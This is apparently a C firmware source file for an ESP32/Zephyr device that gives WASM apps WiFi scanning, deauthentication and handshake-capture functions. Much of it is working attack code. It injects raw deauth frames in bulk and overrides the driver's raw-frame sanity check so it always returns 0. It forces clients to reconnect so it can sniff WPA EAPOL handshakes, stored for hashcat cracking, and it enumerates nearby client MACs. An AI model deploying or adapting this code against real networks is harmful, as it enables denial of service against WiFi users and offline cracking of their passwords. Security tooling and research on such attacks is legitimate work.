/**
 * @file akira_wifi_api.c
 * @brief WiFi scan and deauth WASM-native API — compiled whenever CONFIG_WIFI=y
 */

#include "akira_api.h"
#include "akira_rf_api.h"
#include <runtime/security.h>
#include <zephyr/logging/log.h>

#ifdef CONFIG_WIFI
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#if defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32)
#include <esp_wifi.h>
#endif
#endif

#include "connectivity/radio_interface.h"
#include <string.h>

LOG_MODULE_REGISTER(akira_wifi_api, CONFIG_AKIRA_LOG_LEVEL);

#ifdef CONFIG_WIFI

/* ── Spectrum scan (per-channel max RSSI) ────────────────────────────── */
#define WIFI_SCAN_MAX_CHANNELS 14
#define WIFI_SCAN_TIMEOUT_MS   5000

struct wifi_scan_ctx {
    int8_t  rssi[WIFI_SCAN_MAX_CHANNELS];
    uint8_t seen[WIFI_SCAN_MAX_CHANNELS];
    struct k_sem done;
};

static struct wifi_scan_ctx g_wifi_scan_ctx;
static struct net_mgmt_event_callback g_wifi_scan_cb;
static bool g_wifi_scan_cb_reg;

static void wifi_scan_event_handler(struct net_mgmt_event_callback *cb,
                                     uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(cb);
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        const struct wifi_scan_result *entry =
            (const struct wifi_scan_result *)cb->info;
        if (entry && entry->channel >= 1 &&
            entry->channel <= WIFI_SCAN_MAX_CHANNELS) {
            int ch = entry->channel - 1;
            if (!g_wifi_scan_ctx.seen[ch] ||
                entry->rssi > g_wifi_scan_ctx.rssi[ch]) {
                g_wifi_scan_ctx.rssi[ch] = entry->rssi;
                g_wifi_scan_ctx.seen[ch] = 1;
            }
        }
    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_wifi_scan_ctx.done);
    }
}

int akira_native_wifi_scan_rssi(wasm_exec_env_t exec_env,
                                 uint32_t buf_ptr, uint32_t buf_len)
{
    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
    if (!module_inst) {
        return -1;
    }

    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (buf_len < WIFI_SCAN_MAX_CHANNELS) {
        return -EINVAL;
    }

    int8_t *dst = (int8_t *)wasm_runtime_addr_app_to_native(module_inst, buf_ptr);
    if (!dst) {
        return -EFAULT;
    }

    struct net_if *iface = net_if_get_default();
    if (!iface) {
        LOG_ERR("wifi_scan_rssi: no default interface");
        return -ENODEV;
    }

    (void)memset(g_wifi_scan_ctx.rssi, RADIO_RSSI_UNAVAILABLE,
                 sizeof(g_wifi_scan_ctx.rssi));
    (void)memset(g_wifi_scan_ctx.seen, 0, sizeof(g_wifi_scan_ctx.seen));
    k_sem_init(&g_wifi_scan_ctx.done, 0, 1);

    if (!g_wifi_scan_cb_reg) {
        net_mgmt_init_event_callback(&g_wifi_scan_cb,
                                     wifi_scan_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_wifi_scan_cb);
        g_wifi_scan_cb_reg = true;
    }

    LOG_INF("Starting WiFi scan for spectrum analysis");

    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("WiFi scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_wifi_scan_ctx.done, K_MSEC(WIFI_SCAN_TIMEOUT_MS));
    if (ret) {
        LOG_WRN("WiFi scan timed out, returning partial results");
    }

    for (int i = 0; i < WIFI_SCAN_MAX_CHANNELS; i++) {
        dst[i] = g_wifi_scan_ctx.rssi[i];
    }

    return WIFI_SCAN_MAX_CHANNELS;
}

/* ── AP scan (full wifi_scan_result records) ─────────────────────────── */

#define WIFI_APS_MAX          64
#define WIFI_AP_ENTRY_SIZE    48    /* sizeof(akira_wifi_ap_t) — must match SDK */
#define WIFI_APS_TIMEOUT_MS   8000

struct wifi_ap_wire {
    uint8_t  ssid[33];      /* +0  null-terminated SSID */
    uint8_t  bssid[6];      /* +33 BSSID (MAC) */
    uint8_t  channel;       /* +39 2.4 GHz channel 1-14 */
    int8_t   rssi;          /* +40 signal strength dBm */
    uint8_t  security;      /* +41 0=open 1=WEP 2=WPA 3=WPA2 4=WPA3 5=ENT */
    uint8_t  _pad[2];       /* +42 align last_seen_ms to 4-byte boundary */
    uint32_t last_seen_ms;  /* +44 k_uptime_get_32() when last seen */
};                          /* total 48 */
BUILD_ASSERT(sizeof(struct wifi_ap_wire) == WIFI_AP_ENTRY_SIZE,
             "wifi_ap_wire / akira_wifi_ap_t size mismatch");

/* Place the large AP buffer in external RAM on PSRAM-equipped boards */
#if defined(CONFIG_SPIRAM)
static struct wifi_ap_wire g_aps_buf[WIFI_APS_MAX] __attribute__((section(".ext_ram.bss")));
#else
static struct wifi_ap_wire g_aps_buf[WIFI_APS_MAX];
#endif
static int                              g_aps_count;
static struct k_sem                     g_aps_sem;
static struct net_mgmt_event_callback   g_aps_cb;
static bool                             g_aps_cb_reg;

static uint8_t ap_map_security(enum wifi_security_type s)
{
    switch (s) {
    case WIFI_SECURITY_TYPE_NONE:            return 0;
    case WIFI_SECURITY_TYPE_WEP:             return 1;
    case WIFI_SECURITY_TYPE_WPA_PSK:         return 2;
    case WIFI_SECURITY_TYPE_PSK:
    case WIFI_SECURITY_TYPE_PSK_SHA256:
    case WIFI_SECURITY_TYPE_WPA_AUTO_PERSONAL:
    case WIFI_SECURITY_TYPE_FT_PSK:          return 3; /* WPA2 */
    case WIFI_SECURITY_TYPE_SAE:
    case WIFI_SECURITY_TYPE_SAE_H2E:
    case WIFI_SECURITY_TYPE_SAE_AUTO:
    case WIFI_SECURITY_TYPE_FT_SAE:
    case WIFI_SECURITY_TYPE_SAE_EXT_KEY:     return 4; /* WPA3 */
    default:                                 return 5; /* Enterprise / unknown */
    }
}

static void wifi_aps_event_handler(struct net_mgmt_event_callback *cb,
                                    uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        if (g_aps_count >= WIFI_APS_MAX) return;
        const struct wifi_scan_result *e =
            (const struct wifi_scan_result *)cb->info;
        if (!e) return;

        for (int i = 0; i < g_aps_count; i++) {
            if (memcmp(g_aps_buf[i].bssid, e->mac, 6) == 0) {
                if (e->rssi > g_aps_buf[i].rssi)
                    g_aps_buf[i].rssi = e->rssi;
                g_aps_buf[i].last_seen_ms = k_uptime_get_32();
                return;
            }
        }

        struct wifi_ap_wire *ap = &g_aps_buf[g_aps_count++];
        uint8_t slen = e->ssid_length < 32u ? e->ssid_length : 32u;
        memcpy(ap->ssid, e->ssid, slen);
        ap->ssid[slen]   = '\0';
        memcpy(ap->bssid, e->mac, 6);
        ap->channel      = e->channel;
        ap->rssi         = e->rssi;
        ap->security     = ap_map_security(e->security);
        ap->_pad[0]      = 0;
        ap->_pad[1]      = 0;
        ap->last_seen_ms = k_uptime_get_32();

    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_aps_sem);
    }
}

int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
                                void *buf, uint32_t buf_len)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (!buf || buf_len < WIFI_AP_ENTRY_SIZE) return -EINVAL;

    struct net_if *iface = net_if_get_default();
    if (!iface) {
        LOG_ERR("wifi_scan_aps: no default interface");
        return -ENODEV;
    }

    uint32_t max_aps = buf_len / WIFI_AP_ENTRY_SIZE;
    if (max_aps > WIFI_APS_MAX) max_aps = WIFI_APS_MAX;

    memset(g_aps_buf, 0, sizeof(g_aps_buf));
    g_aps_count = 0;
    k_sem_init(&g_aps_sem, 0, 1);

    if (!g_aps_cb_reg) {
        net_mgmt_init_event_callback(&g_aps_cb, wifi_aps_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_aps_cb);
        g_aps_cb_reg = true;
    }

    LOG_INF("wifi_scan_aps: starting passive scan");
    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("wifi_scan_aps: scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_aps_sem, K_MSEC(WIFI_APS_TIMEOUT_MS));
    if (ret) LOG_WRN("wifi_scan_aps: timeout, returning %d partial results",
                     g_aps_count);

    uint32_t n = (uint32_t)g_aps_count < max_aps
                 ? (uint32_t)g_aps_count : max_aps;
    memcpy(buf, g_aps_buf, n * WIFI_AP_ENTRY_SIZE);

    LOG_INF("wifi_scan_aps: done — %d APs", g_aps_count);
    return (int)n;
}

#endif /* CONFIG_WIFI */

#if defined(CONFIG_WIFI) && (defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32))

#define WASM_ADDR_CHECK(inst, ptr, len)                                 \
    do {                                                                 \
        if (!(ptr) || !wasm_runtime_validate_native_addr((inst),        \
                                                          (ptr), (len)))\
        { return -EFAULT; }                                              \
    } while (0)

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    /* return 0 to bypass*/
    return 0;
}

#define DEAUTH_MAX_COUNT       9999
#define DEAUTH_MIN_INTERVAL_MS   10

int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
                              void *bssid_ptr, void *client_ptr,
                              int32_t channel, int32_t count, int32_t interval_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);

    if (!bssid_ptr || !client_ptr)               return -EINVAL;
    if (channel < 1 || channel > 14)             return -EINVAL;
    if (count   < 1 || count > DEAUTH_MAX_COUNT) return -EINVAL;
    if (interval_ms < DEAUTH_MIN_INTERVAL_MS) interval_ms = DEAUTH_MIN_INTERVAL_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
    WASM_ADDR_CHECK(inst, client_ptr, 6);

    /* WAMR auto-translates `*`-sig params to native pointers */
    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
    const uint8_t *client = (const uint8_t *)client_ptr;

    /* Promiscuous mode decouples the radio from the managed stack so we
     * can set an arbitrary channel and inject raw 802.11 mgmt frames.
     * Sends via WIFI_IF_STA — always available when WiFi is initialised,
     * unlike WIFI_IF_AP which requires a softAP. */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    /* Build deauth frame */
    struct __attribute__((packed)) {
        uint8_t  fc[2];
        uint8_t  dur[2];
        uint8_t  da[6];
        uint8_t  sa[6];
        uint8_t  bssid[6];
        uint8_t  seq[2];
        uint8_t  reason[2];
    } frame;

    frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
    frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
    frame.reason[0] = 0x07; frame.reason[1] = 0x00;
    memcpy(frame.da,    client, 6);
    memcpy(frame.sa,    bssid,  6);
    memcpy(frame.bssid, bssid,  6);

    int sent = 0;
    for (int32_t i = 0; i < count; i++) {
        uint16_t seq = (uint16_t)(i << 4);
        frame.seq[0] = (uint8_t)(seq & 0xFF);
        frame.seq[1] = (uint8_t)(seq >> 8);

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
        if (err == ESP_OK) {
            sent++;
        } else {
            LOG_ERR("wifi_deauth: tx failed err=%d (0x%x)", err, err);
        }

        if (i < count - 1) k_msleep(interval_ms);
    }

    /* Restore normal WiFi operation */
    esp_wifi_set_promiscuous(false);

    LOG_INF("wifi_deauth: channel=%d count=%d sent=%d", channel, count, sent);
    return sent;
}

/* ── 4-way handshake capture (deauth + sniff EAPOL-Key) ─────────────── */

#define HANDSHAKE_TIMEOUT_MS   12000
#define HANDSHAKE_DEAUTH_COUNT 15

/* WAMR-visible result structure (mirrors handshake_capture_result_t in SDK) */
struct handshake_wire {
    uint8_t  ap_mac[6];     /* AP BSSID */
    uint8_t  sta_mac[6];    /* Client MAC */
    uint8_t  anonce[32];    /* ANonce from M1 */
    uint8_t  snonce[32];    /* SNonce from M2 */
    uint8_t  mic[16];       /* MIC from M2 */
    uint8_t  eapol_frame[256]; /* raw EAPOL frame (M2) for hashcat 22000 */
    uint16_t eapol_len;     /* length of eapol_frame */
    char     ssid[33];      /* AP SSID (null-terminated) */
    int32_t  found;         /* 1 = handshake complete, 0 = timeout */
};

static struct {
    uint8_t            target_bssid[6];
    struct handshake_wire *result;
    struct k_sem       done;
    bool               have_m1;
    bool               have_m2;
    bool               armed;
} g_hs_ctx;

/* 802.11 mgmt header offsets */
#define FC_OFFSET       0
#define ADDR1_OFFSET    4
#define ADDR2_OFFSET    10
#define ADDR3_OFFSET    16
#define DATA_HDR_MIN    24
#define DATA_HDR_MAX    28
#define LLC_SNAP_LEN    8
#define EAPOL_HDR_LEN   4

/* Find LLC/SNAP start by scanning for the 0xAA 0xAA 0x03 pattern. */
static int eapol_find_llc(const uint8_t *payload, uint32_t data_len)
{
    for (int off = DATA_HDR_MIN; off <= DATA_HDR_MAX; off += 2) {
        if (off + LLC_SNAP_LEN + 2 > data_len) break;
        if (payload[off] == 0xAA && payload[off+1] == 0xAA && payload[off+2] == 0x03) {
            return off;
        }
    }
    return -1;
}

/* EAPOL-Key parse: return nonce pointer at fixed offset (key+17) if valid,
 * or NULL.  Also sets *out_mic to MIC bytes (key+77) if non-NULL.
 * If out_frame is non-NULL, copies the raw EAPOL frame (from LLC/SNAP
 * through key body) up to max_frame bytes. */
static const uint8_t *eapol_get_nonce(const uint8_t *payload, uint32_t data_len,
                                       uint8_t *out_mic,
                                       uint8_t *out_frame, uint16_t *out_len,
                                       uint16_t max_frame)
{
    int llc_off = eapol_find_llc(payload, data_len);
    if (llc_off < 0) return NULL;

    const uint8_t *llc = payload + llc_off;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return NULL; /* not EAPOL */

    const uint8_t *eapol = llc + LLC_SNAP_LEN;
    if (eapol[1] != 3) return NULL; /* not EAPOL-Key */

    const uint8_t *key = eapol + EAPOL_HDR_LEN;

    /* Compute EAPOL frame size: from EAPOL version byte to end of body */
    uint16_t eapol_body_len = (uint16_t)(eapol[2] << 8) | eapol[3];
    uint16_t total = (uint16_t)(EAPOL_HDR_LEN + eapol_body_len);

    if (out_mic) {
        memcpy(out_mic, key + 77, 16);
    }
    if (out_frame && out_len) {
        uint16_t copy = (total < max_frame) ? total : max_frame;
        memcpy(out_frame, eapol, copy);
        *out_len = copy;
    }

    return key + 13; /* Key Nonce at offset 13: Desc(1)+KeyInfo(2)+KeyLen(2)+ReplayCtr(8) */
}

static void handshake_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_hs_ctx.armed || type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint32_t data_len = pkt->rx_ctrl.sig_len - 4; /* strip FCS */
    if (data_len < DATA_HDR_MIN + LLC_SNAP_LEN + EAPOL_HDR_LEN) return;

    uint8_t *payload = pkt->payload;
    uint8_t  fc1     = payload[FC_OFFSET + 1];
    bool     from_ap = (fc1 & 0x02) != 0;   /* FromDS */
    bool     to_ap   = (fc1 & 0x01) != 0;   /* ToDS   */

    /* Check BSSID matches target: SA for FromDS, DA for ToDS */
    if (from_ap) {
        if (memcmp(payload + ADDR2_OFFSET, g_hs_ctx.target_bssid, 6) != 0) return;
    } else if (to_ap) {
        if (memcmp(payload + ADDR1_OFFSET, g_hs_ctx.target_bssid, 6) != 0) return;
    } else {
        return;
    }

    const uint8_t *nonce = NULL;
    uint8_t       mic_buf[16];

    if (from_ap && !g_hs_ctx.have_m1) {
        /* M1 — capture ANonce + AP/STA MACs */
        nonce = eapol_get_nonce(payload, data_len, NULL, NULL, NULL, 0);
        if (!nonce) return;
        memcpy(g_hs_ctx.result->anonce, nonce, 32);
        memcpy(g_hs_ctx.result->ap_mac,  payload + ADDR2_OFFSET, 6);
        memcpy(g_hs_ctx.result->sta_mac, payload + ADDR1_OFFSET, 6);
        g_hs_ctx.have_m1 = true;
        LOG_INF("HS: M1 captured");
    }

    if (to_ap && !g_hs_ctx.have_m2) {
        /* M2 — capture SNounce + MIC + raw EAPOL frame */
        nonce = eapol_get_nonce(payload, data_len, mic_buf,
                                g_hs_ctx.result->eapol_frame,
                                &g_hs_ctx.result->eapol_len,
                                sizeof(g_hs_ctx.result->eapol_frame));
        if (!nonce) return;
        memcpy(g_hs_ctx.result->snonce, nonce, 32);
        memcpy(g_hs_ctx.result->mic, mic_buf, 16);
        memcpy(g_hs_ctx.result->sta_mac, payload + ADDR2_OFFSET, 6);
        g_hs_ctx.have_m2 = true;
        LOG_INF("HS: M2 captured");
    }

    if (g_hs_ctx.have_m1 && g_hs_ctx.have_m2) {
        g_hs_ctx.result->found = 1;
        g_hs_ctx.armed = false;
        k_sem_give(&g_hs_ctx.done);
    }
}

int akira_native_wifi_capture_pmkid(wasm_exec_env_t exec_env,
                                     void *bssid_ptr, void *client_ptr,
                                     int32_t channel, const char *ssid_str,
                                     void *result_ptr, int32_t timeout_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);

    if (!bssid_ptr || !client_ptr || !result_ptr) return -EINVAL;
    if (channel < 1 || channel > 14)             return -EINVAL;
    if (timeout_ms < 1000) timeout_ms = HANDSHAKE_TIMEOUT_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
    WASM_ADDR_CHECK(inst, client_ptr, 6);
    WASM_ADDR_CHECK(inst, result_ptr, sizeof(struct handshake_wire));
    WASM_ADDR_CHECK(inst, (void *)ssid_str, 1);

    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
    const uint8_t *client = (const uint8_t *)client_ptr;
    struct handshake_wire *result = (struct handshake_wire *)result_ptr;

    memset(result, 0, sizeof(*result));
    int slen = 0;
    while (ssid_str[slen] && slen < 32) slen++;
    memcpy(result->ssid, ssid_str, slen);
    result->ssid[slen] = '\0';

    memcpy(g_hs_ctx.target_bssid, bssid, 6);
    g_hs_ctx.result   = result;
    g_hs_ctx.have_m1  = false;
    g_hs_ctx.have_m2  = false;
    g_hs_ctx.armed    = true;
    k_sem_init(&g_hs_ctx.done, 0, 1);

    esp_wifi_set_promiscuous_rx_cb(handshake_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    /* Send aggressive deauth burst to force client reconnection */
    LOG_INF("wifi_capture: sending %d deauth on ch%d", HANDSHAKE_DEAUTH_COUNT, channel);
    struct __attribute__((packed)) {
        uint8_t  fc[2], dur[2], da[6], sa[6], bssid[6], seq[2], reason[2];
    } dframe;
    dframe.fc[0]     = 0xC0; dframe.fc[1]     = 0x00;
    dframe.dur[0]    = 0x3A; dframe.dur[1]    = 0x01;
    dframe.reason[0] = 0x07; dframe.reason[1] = 0x00;
    memcpy(dframe.da,    client, 6);
    memcpy(dframe.sa,    bssid,  6);
    memcpy(dframe.bssid, bssid,  6);

    for (int i = 0; i < HANDSHAKE_DEAUTH_COUNT; i++) {
        dframe.seq[0] = (uint8_t)(i << 4);
        dframe.seq[1] = 0;
        esp_wifi_80211_tx(WIFI_IF_STA, &dframe, sizeof(dframe), true);
        k_msleep(30);
    }

    /* Wait for both M1 + M2 or timeout */
    int ret = k_sem_take(&g_hs_ctx.done, K_MSEC((int32_t)timeout_ms));

    g_hs_ctx.armed = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    if (ret == 0 && result->found) {
        LOG_INF("wifi_capture: handshake complete for %s", result->ssid);
        return 1;
    }

    LOG_WRN("wifi_capture: timeout — %s%s",
            g_hs_ctx.have_m1 ? "M1 " : "",
            g_hs_ctx.have_m2 ? "M2 " : "no EAPOL");
    return 0;
}

/* ── Client enumeration (passive sniff on one channel) ─────────────────── */

#define CLIENT_SNIFF_MAX   64
#define CLIENT_SNIFF_DEF_MS 4000

/* WAMR-visible record (mirrors akira_wifi_client_t in SDK) */
struct client_wire {
    uint8_t mac[6];
    int8_t  rssi;
};

static struct {
    uint8_t            target_bssid[6];
    struct client_wire *out;
    int                max_clients;
    int                count;
    bool               armed;
} g_cl_ctx;

/* 802.11 address fields (payload[4]=ADDR1, payload[10]=ADDR2, [16]=ADDR3) */
static bool mac_is_broadcast_or_multicast(const uint8_t *mac)
{
    return (mac[0] & 0x01) != 0;
}

static void client_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_cl_ctx.armed) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t *payload = pkt->payload;
    uint8_t  fc0     = payload[FC_OFFSET];
    uint8_t  fc1     = payload[FC_OFFSET + 1];
    uint8_t  ftype   = fc0 & 0x0C;
    uint8_t  subtype = (fc0 >> 4) & 0x0F;
    bool     from_ap = (fc1 & 0x02) != 0;   /* FromDS */
    bool     to_ap   = (fc1 & 0x01) != 0;   /* ToDS   */

    const uint8_t *client_mac = NULL;

    if (ftype == 0x08 && from_ap &&
        memcmp(payload + ADDR2_OFFSET, g_cl_ctx.target_bssid, 6) == 0) {
        /* Data frame AP→client: BSSID in SA(ADDR2), client in DA(ADDR1) */
        client_mac = payload + ADDR1_OFFSET;
    } else if (ftype == 0x08 && to_ap &&
               memcmp(payload + ADDR1_OFFSET, g_cl_ctx.target_bssid, 6) == 0) {
        /* Data frame client→AP: BSSID in DA(ADDR1), client in SA(ADDR2) */
        client_mac = payload + ADDR2_OFFSET;
    } else if (ftype == 0x00 && subtype == 0x04) {
        /* Probe request from any device sniffing on this channel */
        client_mac = payload + ADDR2_OFFSET; /* SA */
    }

    if (!client_mac || mac_is_broadcast_or_multicast(client_mac)) return;

    int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;

    /* Dedupe — keep the strongest RSSI per MAC */
    for (int i = 0; i < g_cl_ctx.count; i++) {
        if (memcmp(g_cl_ctx.out[i].mac, client_mac, 6) == 0) {
            if (rssi > g_cl_ctx.out[i].rssi) g_cl_ctx.out[i].rssi = rssi;
            return;
        }
    }

    if (g_cl_ctx.count < g_cl_ctx.max_clients) {
        memcpy(g_cl_ctx.out[g_cl_ctx.count].mac, client_mac, 6);
        g_cl_ctx.out[g_cl_ctx.count].rssi = rssi;
        g_cl_ctx.count++;
    }
}

int akira_native_wifi_scan_clients(wasm_exec_env_t exec_env,
                                    void *bssid_ptr, void *out_ptr,
                                    uint32_t out_len, int32_t channel,
                                    int32_t timeout_ms)
{
    if (!bssid_ptr || !out_ptr) return -EINVAL;
    if (channel < 1 || channel > 14) return -EINVAL;

    int max_clients = (int)(out_len / sizeof(struct client_wire));
    if (max_clients < 1) return -EINVAL;
    if (max_clients > CLIENT_SNIFF_MAX) max_clients = CLIENT_SNIFF_MAX;
    if (timeout_ms < 1000) timeout_ms = CLIENT_SNIFF_DEF_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr, 6);
    WASM_ADDR_CHECK(inst, out_ptr, out_len);

    const uint8_t *bssid = (const uint8_t *)bssid_ptr;
    struct client_wire *out = (struct client_wire *)out_ptr;

    memcpy(g_cl_ctx.target_bssid, bssid, 6);
    g_cl_ctx.out        = out;
    g_cl_ctx.max_clients = max_clients;
    g_cl_ctx.count      = 0;
    g_cl_ctx.armed      = true;

    esp_wifi_set_promiscuous_rx_cb(client_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    /* Block for the sniff window; the RX callback fills g_cl_ctx.out. */
    k_sleep(K_MSEC(timeout_ms));

    g_cl_ctx.armed = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    LOG_INF("wifi_scan_clients: ch%d → %d clients", channel, g_cl_ctx.count);
    return g_cl_ctx.count;
}

#endif /* CONFIG_WIFI && ESP32S3/ESP32 */
